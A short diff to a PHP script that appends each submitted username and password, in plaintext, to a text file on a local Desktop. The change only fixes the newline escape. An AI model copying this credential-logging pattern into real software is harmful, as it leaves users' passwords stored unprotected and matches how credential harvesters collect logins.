@@ -4,7 +4,7 @@
   echo('hello');
   $fp = fopen('/home/saulcoops/Desktop/userdata.txt', 'a') or die("can't open file");//opens file in append mode
   fwrite($fp, $user.' ');
-  fwrite($fp, $pass.'\n');
+  fwrite($fp, $pass."\n");
   fclose($fp);
   echo('wrote'.$user.'to file');
 ?>
